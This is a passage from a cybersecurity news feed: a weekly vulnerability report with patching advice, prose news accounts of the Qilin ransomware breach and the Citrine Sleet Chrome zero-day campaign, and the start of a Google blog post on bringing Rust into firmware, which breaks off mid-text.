<p><img alt="Weekly-IT-Vulnerability-Report" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="480" src="https://cyble.com/wp-content/uploads/2024/09/Weekly-IT-Vulnerability-Report.png" tabindex="0" width="960" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways:</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list {"ordered":true} --></p>
<ol class="wp-block-list"><!-- wp:list-item --></p>
<li>CISA incorporated four vulnerabilities (CVE-2021-20123, CVE-2021-20124, CVE-2024-7262, and CVE-2024-7965) into its Known Exploited Vulnerability (KEV) catalog based on evidence of active exploitation.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The Cyble team analyzed critical and high-severity CVEs including those impacting networking products CVE-2024-7261 and CVE-2024-44341 and Dell's PowerProtect tool CVE-2024-37136, which could lead to remote code execution and information exposure.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>CRIL detected multiple instances of vulnerability discussions and proof-of-concept sharing in underground forums and channels, including for critical flaws (CVE-2024-38063, CVE-2024-5932, CVE-2024-43044, CVE-2024-6670 and CVE-2024-3116) in Windows, WordPress, Jenkins, and other products.</li>
<p><!-- /wp:list-item --></ol>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This Weekly Vulnerability Intelligence Report explores vulnerability updates between August 28 to September 3. The CRIL team investigated 13 vulnerabilities this week, among other disclosed issues, to present critical, high, and medium insights.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This comprehensive analysis examines the latest <a href="https://cyble.com/knowledge-hub/cybersecurity/">cybersecurity</a> threats and provides recommendations to help organizations strengthen their defenses.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">The Week’s Top Vulnerabilities</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>&nbsp;Here is a deeper analysis of those five vulnerabilities identified by Cyble researchers.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list {"ordered":true} --></p>
<ol class="wp-block-list"><!-- wp:list-item --></p>
<li>CVE-2024-7261: Improper Neutralization of Special Elements in Zyxel  Firmware<br />Critical vulnerability in Zyxel products, could allow an unauthenticated attacker to execute OS commands by sending a crafted cookie to a vulnerable device. The impact of this flaw is significant, as it could enable remote code execution and compromise the affected systems.</li>
<p><!-- /wp:list-item --></ol>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>CVE-2024-37136: Exposure of Private Personal Information in Dell Path to PowerProtect<br />Impacts Dell Path to PowerProtect, a tool used for policy migration and agent onboarding. A remote, high-privileged attacker could potentially exploit this vulnerability, leading to information exposure.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>CVE-2024-44341: remote command execution (RCE) vulnerability in D-Link<br />Critical remote command execution (RCE) vulnerability, affects the D-Link DIR-846W A1 FW100A43 wireless router model. Attackers can exploit this flaw by sending a crafted POST request to the vulnerable device.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>CVE-2024-7971: Type confusion in V8 in Google Chrome prior to 128.0.6613.84<br />Type confusion vulnerability in Google Chrome's V8 engine, Microsoft has disclosed with a high degree of confidence that they observed exploitation of this vulnerability by a <a href="https://cyble.com/blog/ta-fudmodule-rootkit-targets-crypto-linked-to-north-korean-citrine-sleet-group/">North Korean threat actor</a> targeting the cryptocurrency sector.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Vulnerabilities and Exploits Discussed in the Underground</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CRIL observed multiple instances of vulnerability discussions and the promulgation of proof-of-concepts (POCs) in underground forums and channels.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>On a Telegram channel named 'Proxy Bar,' the administrator shared POCs for several critical and high-severity vulnerabilities, including CVE-2024-38063 (Windows TCP/IP RCE), CVE-2024-5932 (GiveWP RCE), and CVE-2024-43044 (Jenkins arbitrary file read).</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>On the Telegram channel CyberDilara, the administrator shared a POC for CVE-2024-6670, a critical SQL injection vulnerability in WhatsUp Gold. TA Neo_Matrix also shared a POC for CVE-2024-3116, a high-severity RCE vulnerability in pgAdmin.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>TA KeeperZed offered a<a href="https://cyble.com/knowledge-hub/zero-day-exploit/"> 0-day vulnerability</a> affecting devices running iOS <a>17.xx</a> and iOS 18.xx (Beta) on a forum, attempting to sell it for $2.5 million.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Cyble’s Recommendations</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>To mitigate the risks posed by these vulnerabilities, CRIL recommends the following actions:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list {"ordered":true} --></p>
<ol class="wp-block-list"><!-- wp:list-item --></p>
<li>Implement the latest patches<br /> Regularly update all software and hardware systems with the latest patches from official vendors to address vulnerabilities and protect against exploits.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Establish a robust patch management process<br />Develop a comprehensive patch management strategy that includes inventory management, patch assessment, testing, deployment, and verification.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Implement proper network segmentation<br />Divide the network into distinct segments to isolate critical assets from less secure areas, using <a href="https://cyble.com/knowledge-hub/what-is-firewall/">firewalls</a>, VLANs, and access controls.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Enhance incident response and recovery capabilities<br /> Create and maintain an incident response plan, and regularly test and update it to ensure effectiveness.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Strengthen monitoring and logging<br /> Implement comprehensive monitoring and logging solutions to detect and analyze suspicious activities across the network.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Enhance Incident Response and Recovery Capabilities<br />Create and maintain an <a href="https://cyble.com/knowledge-hub/what-is-incident-response/">incident response plan</a> that outlines procedures for detecting, responding to, and recovering from security incidents. Regularly test and update the plan to ensure its effectiveness and alignment with current threats.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Strengthen Monitoring and Logging<br /> Implement comprehensive monitoring and logging solutions to detect and analyze suspicious activities across the network.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Stay Informed of Security Alerts<br /> Subscribe to security advisories and alerts from official vendors, CERTs, and other authoritative sources. Regularly review and assess the impact of these alerts on your systems and take appropriate actions.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Conduct Vulnerability Assessments and Penetration Testing<br />Conduct regular VAPT exercises to identify and remediate vulnerabilities in your systems. Complement these exercises with periodic security audits to ensure compliance with security policies and standards.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Maintain Visibility into Assets<br /> Maintain an up-to-date inventory of all internal and external assets, including hardware, software, and network components. Use asset management tools and continuous monitoring to ensure comprehensive visibility and control over the IT environment.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Enforce Strong Password Policies and Multi-Factor Authentication<br /> Change default passwords immediately and enforce a robust password policy across the organization. Implement <a href="https://cyble.com/blog/multi-factor-authentication-mfa-is-a-part-of-your-cyber-hygiene/">multi-factor authentication</a> (MFA) to provide an extra layer of security and significantly reduce the risk of unauthorized access.</li>
<p><!-- /wp:list-item --></ol>
<p><!-- /wp:list --></p>
<p>The post <a href="https://cyble.com/blog/weekly-it-vulnerability-report-for-august-28-2024-september-03-2024/" rel="nofollow">Weekly IT Vulnerability Report for August 28, 2024 – September 03, 2024</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Tue, 03 Sep 2024 07:30:32 +0000</pubDate>
</item>
<item>
<title>Sophos X-Ops Uncovers Major Qilin Ransomware Breach Targeting Chrome Browser Credentials</title>
<link>https://www.cysecurity.news/2024/09/sophos-x-ops-uncovers-major-qilin.html</link>
<guid>https://www.cysecurity.news/2024/09/sophos-x-ops-uncovers-major-qilin.html</guid>
<content:encoded><![CDATA[
<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_3RovNmYxQbKNyNnXn3LVIbjx05QcyzBxshAXxKcHNWSnnOwIOaCLzTsuKbzK69qbshWCL_wl92g1iNLwWDo2ZESGo1IgpRjwZPw9yBmn_J1VAecoRG5Z3x-Uk1QItOykWwSg3R_qfG3Kl9DayACzQPA81MOsYLrUe7QsCPy5qw0lS6N64PTpAJbPAGw/s6267/pexels-cottonbro-5483077.jpg" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_3RovNmYxQbKNyNnXn3LVIbjx05QcyzBxshAXxKcHNWSnnOwIOaCLzTsuKbzK69qbshWCL_wl92g1iNLwWDo2ZESGo1IgpRjwZPw9yBmn_J1VAecoRG5Z3x-Uk1QItOykWwSg3R_qfG3Kl9DayACzQPA81MOsYLrUe7QsCPy5qw0lS6N64PTpAJbPAGw/s600/pexels-cottonbro-5483077.jpg" width="600" /></a></div><p>&nbsp;</p><div style="text-align: justify;">Cybersecurity firm Sophos X-Ops has exposed a significant ransomware breach by the Qilin group, which has introduced a new and highly concerning technique of stealing credentials stored in Google Chrome browsers on compromised systems. Qilin, active since at least 2022, is already notorious for its "double extortion" strategy. This method involves encrypting the victim’s data while simultaneously threatening to leak or sell the data unless a ransom is paid.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The discovery of Qilin's latest tactic underscores the evolution of ransomware attacks into more sophisticated and damaging operations.

The breach came to light following an attack on Synnovis, a UK governmental healthcare service provider.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The attack began with the exploitation of compromised credentials to access the organization’s VPN portal, which lacked multi-factor authentication (MFA), allowing the attackers initial access. Once inside, the attackers spent 18 days conducting surveillance before moving laterally to a domain controller.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Here, they modified the Group Policy Objects (GPO) to implement a malicious PowerShell script named `IPScanner.ps1`. This script was designed to harvest login credentials stored in Google Chrome browsers and was automatically executed every time users logged into their devices.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The stolen credentials were stored in the SYSVOL share, labeled by the infected device's hostname, and subsequently exfiltrated to the attackers' command-and-control server. To avoid detection, the attackers cleared event logs and deleted the local data copies before deploying the ransomware.

Given that Google Chrome holds over 65 per cent of the browser market share, the attackers were able to access a large array of usernames and passwords stored by users, raising the scale of the breach.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">This method of credential harvesting introduces a new layer of threat, potentially allowing Qilin to access multiple high-value targets, complicating response efforts for organizations.

Affected organizations have been urged to reset all Active Directory passwords and advise users to change the passwords of any sites saved in Chrome.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">This tactic may serve as a "bonus multiplier" for attackers, increasing the chaos inherent in ransomware situations by gaining insights into high-value accounts, making future attacks even more damaging.

This breach highlights a growing concern over organizations' abilities to defend against such multifaceted and evolving ransomware threats</div>
]]></content:encoded>
<pubDate>2024-09-06T09:08:15.878-04:00</pubDate>
</item>
<item>
<title>Citrine Sleet APT Exploits Chrome Zero-Day Vulnerability for Rootkit Infiltration</title>
<link>https://www.cysecurity.news/2024/09/citrine-sleet-apt-exploits-chrome-zero.html</link>
<guid>https://www.cysecurity.news/2024/09/citrine-sleet-apt-exploits-chrome-zero.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIbV3o-LmQA3pU2Bt66RVyIHYZ5qZNhDddmCzAJl8VsKf05VOnfQmRrKHrI6MzRm8OvEhiA2qXyrBRqOFh-i5h1p8liDd92psx7TtFzQEIZcQ6GjB9Dx8B2wqYTHShyphenhyphenpcj37uZHW0jxb5RvUO1BmQSybKcgnqhrfR6KDtUPRwYopDg8du0ZAEQiGghma40/s6016/pexels-anete-lusina-5240547.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="428" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIbV3o-LmQA3pU2Bt66RVyIHYZ5qZNhDddmCzAJl8VsKf05VOnfQmRrKHrI6MzRm8OvEhiA2qXyrBRqOFh-i5h1p8liDd92psx7TtFzQEIZcQ6GjB9Dx8B2wqYTHShyphenhyphenpcj37uZHW0jxb5RvUO1BmQSybKcgnqhrfR6KDtUPRwYopDg8du0ZAEQiGghma40/w640-h428/pexels-anete-lusina-5240547.jpg" width="640" /></a></div><br /><p></p><div style="text-align: justify;">It is believed that North Korean hackers have been able to use unpatched zero-day in Google Chrome (CVE-2024-7971) to install a rootkit called FudModule after gaining admin privileges by exploiting a kernel vulnerability in Microsoft Windows.



An investigation by Microsoft has revealed that a North Korean threat actor exploited a zero-day vulnerability in the Chromium browser that has been tracked as CVE-2024-7971 to conduct a sophisticated cyber operation.&nbsp;&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">According to the report, Citrine Sleet, the notorious group behind the attack that targets cryptography sectors in particular, is responsible for the attack.

It has been reported that CVE-2024-7971 is a type of confusion vulnerability in the V8 JavaScript and WebAssembly engine that had been impacted in versions of Chrome before 128.0.6613.84. By exploiting this vulnerability, threat actors could gain remote code execution (RCE) access to the sandboxed Chromium renderer process and conduct a remote attack.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">There was a vulnerability that was fixed by Google on August 21, 2024, and users should ensure that they are running the most recent version of Chrome.

It is clear from this development that the nation-state adversary is trying to increase its penetration of Windows zero-day exploits in recent months, indicating that they are persistent in their efforts to acquire and introduce oodles of zero-day exploits.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">A Microsoft security researcher found evidence that Citrine Sleet (formerly DEV-0139 and DEV-1222) was responsible for the activity. Citrine Sleet is also known as AppleJeus, Labyrinth Chollima, Nickel Academy, and UNC4736, all of which are associated with Citrine Sleet. There is an assessment that this sub-cluster is part of the Lazarus Group (a.k.a. Diamond Sleet and Hidden Cobra) which is related to Lazarus.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Several analysts have previously credited the use of AppleJeus malware to a Lazarus subgroup called BlueNoroff (also known as APT38, Nickel Gladstone, and Stardust Chollima), indicating the fact that the threat actors share both toolsets and infrastructure from one subgroup to another.

Some cybersecurity vendors maintain track of this North Korean threat group under different names, such as AppleJeus, Labyrinth Chollima, and UNC4736, among others.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Hidden Cobra is a term used by the U.S. government to describe malicious actors sponsored by the North Korean government collectively as being influenced by the state. It is mostly targeted at financial institutions, with a special focus on cryptocurrency organizations and individuals who are closely associated with the cryptocurrency industry.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In the past, it has been linked to Bureau 121 of the Reconnaissance General Bureau of North Korea, where it practices intelligence gathering.

Moreover, North Korean hackers are also known for using malicious websites that appear to be legitimate cryptocurrency trading platforms to infect prospective victims with fake job applications, weaponized cryptocurrency wallets, and cryptocurrency trading apps designed to steal sensitive information.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">This is the first time UNC4736 malware has been identified in a supply chain attack, for example in March 2023 it attacked the Electron-based desktop client of video conferencing software provider 3CX. Further, they were able to breach the website of Trading Technologies, an automation company for stock market trading, to sneakily push trojanized versions of the X_TRADER software into the system.

In a March 2022 report, Google's Threat Analysis Group (TAG) also linked AppleJeus to the compromise of Trading Technologies' website, highlighting AppleJeus as being behind the attack.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">For years, the U.S. government has repeatedly issued warnings about state-sponsored cyberattacks targeting cryptocurrency-related businesses and individuals with AppleJeus malware that is backed by the North Korean government. As a result of the security vulnerability CVE-2024-7971 that was discovered last week, Google patched Chrome's version 8 JavaScript engine and reported it as a type confusion vulnerability.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In a recent cybersecurity incident report, it was revealed that victims were directed to a domain controlled by the threat group Citrine Sleet, identified as voyagorclub[.]space. The exact method by which victims were lured to this domain remains undetermined, though it is suspected that social engineering tactics were employed. This is consistent with Citrine Sleet’s established modus operandi, which frequently involves manipulating individuals through social engineering to initiate attacks.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Upon successful redirection to the malicious domain, attackers leveraged a zero-day remote code execution (RCE) vulnerability, identified as CVE-2024-7971. This vulnerability is linked to a type of confusion flaw in Chrome’s V8 JavaScript engine. Google addressed this security issue in a recent patch, highlighting that it allowed attackers to achieve RCE within the sandboxed Chromium renderer process of the victim's browser. Once inside this sandboxed environment, the attackers further escalated their access by exploiting a secondary vulnerability in the Windows kernel.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The additional vulnerability, CVE-2024-38106, was exploited to escape the browser’s sandbox environment. This kernel vulnerability, which Microsoft had patched in their latest Patch Tuesday release, allowed attackers to gain SYSTEM-level privileges on the compromised system. Following this, the attackers downloaded and activated a highly sophisticated rootkit known as FudModule. This malware, when loaded into memory, enabled direct kernel object manipulation (DKOM), providing attackers with the capability to bypass critical kernel security measures.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The FudModule rootkit is particularly concerning, as it is designed to manipulate kernel-level processes, enabling attackers to establish persistent backdoor access to the compromised system. Through DKOM, the rootkit effectively tampers with core system functions, allowing attackers to evade detection, steal sensitive information, and potentially deploy additional malicious software.

Interestingly, the FudModule rootkit has been linked to another North Korean state-sponsored group known as Diamond Sleet, which has utilized this malware since its discovery in October 2022.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">This suggests a potential collaboration between Citrine Sleet and Diamond Sleet or, at the very least, shared access to malicious tools and infrastructure. Furthermore, the rootkit bears similarities to tools used by another notorious hacking group, the Lazarus Group, indicating that FudModule may be part of a broader North Korean cyber-espionage toolkit.

Citrine Sleet's attack demonstrates a highly coordinated and multi-faceted approach, beginning with social engineering techniques to lure victims to a compromised domain and culminating in the exploitation of critical vulnerabilities to gain deep control over target systems.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">By leveraging both CVE-2024-7971 and CVE-2024-38106, the attackers were able to bypass multiple layers of security, from browser sandboxing to Windows kernel defences.

Microsoft has issued a series of recommendations to help organizations mitigate the risk of such attacks. They stress the importance of maintaining up-to-date software and operating systems, as timely patching is critical to closing vulnerabilities before they can be exploited.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Additionally, Microsoft advocates for the deployment of security solutions that provide unified visibility across the entire cyberattack chain. Such tools can detect and block attacker tools and post-compromise malicious activity. Lastly, strengthening the configuration of the operating environment is recommended to minimize the likelihood of successful exploitation and post-compromise activity. 

This incident underscores the evolving nature of cyber threats and highlights the importance of proactive cybersecurity measures to detect, block, and mitigate advanced persistent threats (APTs).</div>
]]></content:encoded>
<pubDate>2024-09-05T10:45:10.514-04:00</pubDate>
</item>
<item>
<title>Deploying Rust in Existing Firmware Codebases</title>
<link>http://security.googleblog.com/2024/09/deploying-rust-in-existing-firmware.html</link>
<guid>http://security.googleblog.com/2024/09/deploying-rust-in-existing-firmware.html</guid>
<content:encoded><![CDATA[
<p style="text-align: left;"><span class="byline-author">Posted by Ivan Lozano and Dominik Maier, Android Team</span> <p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Android's use of safe-by-design principles drives our adoption of memory-safe languages like Rust, making exploitation of the OS increasingly difficult with every release. To provide a secure foundation, we’re extending hardening and the use of </span><a href="https://security.googleblog.com/2023/10/bare-metal-rust-in-android.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">memory-safe languages to low-level firmware</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> (including in </span><a href="https://cs.android.com/android/platform/superproject/main/+/main:trusty/user/app/keymint/lib.rs;drc=4176f2465d7dc81c398730cb579c0a4949a9a832"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Trusty apps</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">).</span></p><br /><p dir="ltr" style="line-height: 1.3800000000000001; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">In this blog post, we'll show you how to gradually introduce </span><a href="https://security.googleblog.com/2021/04/rust-in-android-platform.html#:~:text=But%20what%20about%20all%20that%20existing%20C%2B%2B%3F"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Rust into your existing firmware</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, prioritizing new code and the most security-critical code. You'll see how easy it is to boost security with drop-in Rust replacements, and we'll even demonstrate how the Rust toolchain can handle specialized bare-metal targets.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Drop-in Rust replacements for C code are not a novel idea and have been used in other cases, such as </span><a href="https://mail.gnome.org/archives/desktop-devel-list/2017-January/msg00001.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">librsvg’s adoption of Rust</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> which involved </span><a href="https://web.archive.org/web/20170928062853/https://people.gnome.org/~federico/blog/docs/fmq-porting-c-to-rust.pdf"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">replacing C functions with Rust functions</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> in-place. We seek to demonstrate that this approach is viable for firmware, providing a path to memory-safety in an efficient and effective manner.</span></p><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: Arial, sans-serif; font-size: 20pt; font-weight: 400; vertical-align: baseline;">Memory Safety for Firmware</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Firmware serves as the interface between hardware and higher-level software. Due to the lack of software security mechanisms that are standard in higher-level software, vulnerabilities in firmware code can be dangerously exploited by malicious actors. Modern phones contain many coprocessors responsible for handling various operations, and each of these run their own firmware. Often, firmware consists of large legacy code bases written in memory-unsafe languages such as C or C++. Memory unsafety is the leading cause of vulnerabilities in </span><a href="https://source.android.com/docs/security/test/memory-safety"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Android</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, </span><a href="https://www.chromium.org/Home/chromium-security/memory-safety/"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Chrome</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, and many other code bases.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Rust provides a memory-safe alternative to C and C++ with comparable performance and code size. Additionally it supports interoperability with C with no overhead. The Android team has discussed </span><a href="https://security.googleblog.com/2023/10/bare-metal-rust-in-android.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Rust for bare-metal firmware previously</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, and has </span><a href="https://google.github.io/comprehensive-rust/bare-metal.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">developed training specifically for this domain</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="font-family: Arial, sans-serif; font-size: 20pt; font-weight: 400; vertical-align: baseline;">Incremental Rust Adoption</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Our incremental approach focusing on replacing new and highest risk existing code (for example, code which processes external untrusted input) can provide maximum security benefits with the least amount of effort. Simply writing any new code in Rust reduces the number of new vulnerabilities and over time can lead to a reduction in </span><a href="https://security.googleblog.com/2021/04/rust-in-android-platform.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">the number of outstanding vulnerabilities</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">You can replace existing C functionality by writing a thin Rust shim that translates between an existing Rust API and the C API the codebase expects. The C API is replicated and exported by the shim for the existing codebase to link against. The shim serves as </span><a href="https://doc.rust-lang.org/nomicon/ffi.html#calling-rust-code-from-c"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">a wrapper</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> around the Rust library API, bridging the existing C API and the Rust API. This is a common approach when rewriting or replacing existing libraries with a Rust alternative.</span></p><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: Arial, sans-serif; font-size: 20pt; font-weight: 400; vertical-align: baseline;">Challenges and Considerations</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">There are several challenges you need to consider before introducing Rust to your firmware codebase. In the following section we address the general state of </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> Rust (that is, bare-metal Rust code), how to find the right off-the-shelf crate (a rust library), porting an std crate to </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">no_std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, using Bindgen to produce FFI bindings, how to approach allocators and panics, and how to set up your toolchain.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">The Rust Standard Library and Bare-Metal Environments</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Rust's standard library consists of three crates: </span><a href="https://doc.rust-lang.org/core/"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">core</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, </span><a href="https://doc.rust-lang.org/alloc/"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, and </span><a href="https://doc.rust-lang.org/std/"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">. The </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">core</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate is always available. The </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate requires an allocator for its functionality. The </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate assumes a full-blown operating system and is commonly not supported in bare-metal environments. A third-party crate indicates it doesn’t rely on </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: 